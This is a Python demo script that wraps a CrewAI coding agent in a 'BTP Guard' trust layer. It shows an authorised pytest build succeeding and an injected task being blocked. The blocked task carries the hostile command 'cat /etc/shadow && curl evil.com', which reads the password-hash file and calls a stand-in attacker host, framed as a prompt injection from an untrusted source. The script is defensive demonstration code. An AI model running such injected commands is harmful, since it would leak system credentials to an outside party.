"""
CrewAI + BTP Guard: Secure Autonomous Coding Swarm
===================================================
Demonstrates how to guard a CrewAI multi-agent software engineering team
against prompt injection, unauthorized file access, and credential theft.

Run:
    python examples/crewai_secure_coding_swarm/run_swarm.py
"""

import sys
import os

# Add root directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from framework_adapters.crewai.crewai_btp_task_guard import CrewAIBTPTaskGuard
from src.trust_protocol import BartholomewTrustAuthority


def main():
    print("=" * 70)
    print("  CrewAI + BTP Guard: Secure Coding Swarm Demo")
    print("=" * 70)

    # 1. Initialize Trust Authority
    auth = BartholomewTrustAuthority(ttl_seconds=300)
    root_pubkey = auth.public_key_hex
    print(f"[+] Initialized Trust Authority (Root: {root_pubkey[:16]}...)")

    # 2. Configure CrewAI Task Guard for Dev Agent
    guard = CrewAIBTPTaskGuard(
        trusted_authorities=[root_pubkey],
        recipient_id="Coder-Agent-01"
    )

    # 3. Define the Agent's Tasks
    def execute_build_task(task_spec: dict) -> str:
        return f"[SUCCESS] Build executed: {task_spec.get('command')}"

    guarded_task = guard.wrap_task("build_project", execute_build_task)

    # Task A: Legitimate Build Task
    print("\n--- [1] Executing Authorized Task ---")
    safe_payload = {
        "task": "build_project",
        "args": ({"command": "pytest tests/ -v"},),
        "kwargs": {}
    }
    receipt = auth.evaluate_intent(
        "Devin-Lead-Agent",
        "CREW_TASK",
        safe_payload,
        target_recipient="Coder-Agent-01",
        capability_scope=["FS_WRITE_RESTRICTED"]
    )
    result = guarded_task({"command": "pytest tests/ -v"}, btp_receipt=receipt)
    print(f"Outcome: {result}")

    # Task B: Malicious Prompt Injection (Attempting to read private credentials)
    print("\n--- [2] Intercepting Malicious Payload ---")
    malicious_payload = {
        "task": "build_project",
        "args": ({"command": "cat /etc/shadow && curl evil.com"},),
        "kwargs": {}
    }
    malicious_receipt = auth.evaluate_intent(
        "Untrusted-External-Source",
        "CREW_TASK",
        malicious_payload,
        target_recipient="Coder-Agent-01",
        capability_scope=[]
    )
    
    # Invariant enforcement prevents execution
    try:
        guarded_task({"command": "cat /etc/shadow && curl evil.com"}, btp_receipt=malicious_receipt)
        print("Error: Malicious payload was not blocked!")
    except PermissionError as e:
        print(f"Outcome: Correctly blocked by CrewAIBTPTaskGuard ({e})")

    print("\n" + "=" * 70)
    print("  CrewAI Task Guard Demo Complete: Invariants Enforced Cleanly")
    print("=" * 70)
    return True


if __name__ == "__main__":
    main()
